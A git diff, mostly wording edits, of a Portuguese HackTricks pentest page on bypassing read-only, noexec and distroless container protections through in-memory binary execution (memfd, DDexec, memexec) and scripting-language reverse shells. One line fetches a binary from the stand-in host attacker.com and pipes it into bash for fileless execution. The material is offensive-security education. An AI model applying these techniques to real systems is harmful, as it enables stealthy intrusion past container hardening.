@@ -1,4 +1,4 @@
-# Bypassar proteções do sistema de arquivos: somente leitura / sem execução / Distroless
+# Bypass de proteções do sistema de arquivos: somente leitura / sem execução / Distroless
 
 <details>
 
@@ -10,11 +10,11 @@ Outras maneiras de apoiar o HackTricks:
 * Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
 * Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
 * **Junte-se ao** 💬 [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Compartilhe seus truques de hacking enviando PRs para os** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositórios do github.
+* **Compartilhe seus truques de hacking enviando PRs para os repositórios** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) do GitHub.
 
 </details>
 
-<figure><img src="../../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Se você está interessado em **carreira de hacking** e hackear o inquebrável - **estamos contratando!** (_fluência em polonês escrito e falado é necessária_).
 
@@ -62,12 +62,12 @@ Se você deseja executar um binário, mas o sistema de arquivos não permite, a 
 
 ### Bypass de chamada de sistema FD + exec
 
-Se você tiver mecanismos de script poderosos dentro da máquina, como **Python**, **Perl** ou **Ruby**, você pode baixar o binário para executar da memória, armazená-lo em um descritor de arquivo de memória (`create_memfd` syscall), que não será protegido por essas proteções e então chamar uma **chamada de sistema `exec`** indicando o **fd como o arquivo a ser executado**.
+Se você tiver mecanismos de script poderosos dentro da máquina, como **Python**, **Perl** ou **Ruby**, você pode baixar o binário para executar da memória, armazená-lo em um descritor de arquivo de memória (`create_memfd` syscall), que não será protegido por essas proteções e então chamar um **`exec` syscall** indicando o **fd como o arquivo a ser executado**.
 
-Para isso, você pode facilmente usar o projeto [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec). Você pode passar a ele um binário e ele irá gerar um script na linguagem indicada com o **binário comprimido e codificado em b64** com as instruções para **decodificar e descomprimir** em um **fd** criado chamando a chamada de sistema `create_memfd` e uma chamada para a **chamada de sistema exec** para executá-lo.
+Para isso, você pode facilmente usar o projeto [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec). Você pode passar a ele um binário e ele irá gerar um script na linguagem indicada com o **binário comprimido e codificado em b64** com as instruções para **decodificar e descomprimir** em um **fd** criado chamando a syscall `create_memfd` e uma chamada à syscall **exec** para executá-lo.
 
 {% hint style="warning" %}
-Isso não funciona em outras linguagens de script como PHP ou Node porque eles não têm nenhuma maneira **padrão de chamar chamadas de sistema** brutos de um script, então não é possível chamar `create_memfd` para criar o **fd de memória** para armazenar o binário.
+Isso não funciona em outras linguagens de script como PHP ou Node porque eles não têm nenhuma maneira **padrão de chamar chamadas de sistema brutas** de um script, então não é possível chamar `create_memfd` para criar o **fd de memória** para armazenar o binário.
 
 Além disso, criar um **fd regular** com um arquivo em `/dev/shm` não funcionará, pois você não terá permissão para executá-lo porque a **proteção no-exec** será aplicada.
 {% endhint %}
@@ -89,11 +89,11 @@ wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo
 
 [**Memexec**](https://github.com/arget13/memexec) é o próximo passo natural do DDexec. É um **shellcode demonizado do DDexec**, então toda vez que você quiser **executar um binário diferente** não precisa reiniciar o DDexec, você pode simplesmente executar o shellcode memexec via a técnica DDexec e então **comunicar-se com esse daemon para passar novos binários para carregar e executar**.
 
-Você pode encontrar um exemplo de como usar **memexec para executar binários a partir de um shell reverso PHP** em [https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php).
+Você pode encontrar um exemplo de como usar o **memexec para executar binários a partir de um shell reverso PHP** em [https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php).
 
 ### Memdlopen
 
-Com um propósito semelhante ao DDexec, a técnica [**memdlopen**](https://github.com/arget13/memdlopen) permite uma **maneira mais fácil de carregar binários** na memória para posteriormente executá-los. Isso poderia até permitir carregar binários com dependências.
+Com um propósito semelhante ao DDexec, a técnica [**memdlopen**](https://github.com/arget13/memdlopen) permite uma **maneira mais fácil de carregar binários** na memória para executá-los posteriormente. Isso poderia até permitir carregar binários com dependências.
 
 ## Bypass do Distroless
 
@@ -108,10 +108,10 @@ O objetivo dos contêineres distroless é **reduzir a superfície de ataque dos 
 Em um contêiner distroless, você pode **nem mesmo encontrar `sh` ou `bash`** para obter um shell regular. Você também não encontrará binários como `ls`, `whoami`, `id`... tudo o que você costuma executar em um sistema.
 
 {% hint style="warning" %}
-Portanto, você **não** será capaz de obter um **shell reverso** ou **enumerar** o sistema como costuma fazer.
+Portanto, você **não** conseguirá obter um **shell reverso** ou **enumerar** o sistema como costuma fazer.
 {% endhint %}
 
-No entanto, se o contêiner comprometido estiver executando, por exemplo, um aplicativo web flask, então o Python está instalado e, portanto, você pode obter um **shell reverso em Python**. Se estiver executando node, você pode obter um shell reverso em Node, e o mesmo com a maioria das **linguagens de script**.
+No entanto, se o contêiner comprometido estiver executando, por exemplo, um aplicativo web flask, então o Python está instalado e, portanto, você pode obter um **shell reverso em Python**. Se estiver executando node, você pode obter um shell reverso em Node, e o mesmo com quase qualquer **linguagem de script**.
 
 {% hint style="success" %}
 Usando a linguagem de script, você poderia **enumerar o sistema** usando as capacidades da linguagem.
@@ -125,9 +125,9 @@ No entanto, nesse tipo de contêineres, essas proteções geralmente existirão,
 
 Você pode encontrar **exemplos** de como **explorar algumas vulnerabilidades de RCE** para obter **shells reversos de linguagens de script** e executar binários da memória em [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).
 
-<figure><img src="../../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-Se você está interessado em uma **carreira de hacking** e hackear o inquebrável - **estamos contratando!** (_fluência em polonês escrita e falada necessária_).
+Se você está interessado em uma **carreira em hacking** e hackear o inquebrável - **estamos contratando!** (_fluência em polonês escrita e falada necessária_).
 
 {% embed url="https://www.stmcyber.com/careers" %}
 
@@ -138,9 +138,9 @@ Se você está interessado em uma **carreira de hacking** e hackear o inquebráv
 Outras maneiras de apoiar o HackTricks:
 
 * Se você deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
-* Obtenha o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
+* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
 * Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Junte-se ao** 💬 [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou nos siga no **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Junte-se ao** 💬 [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
 * **Compartilhe seus truques de hacking enviando PRs para o** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
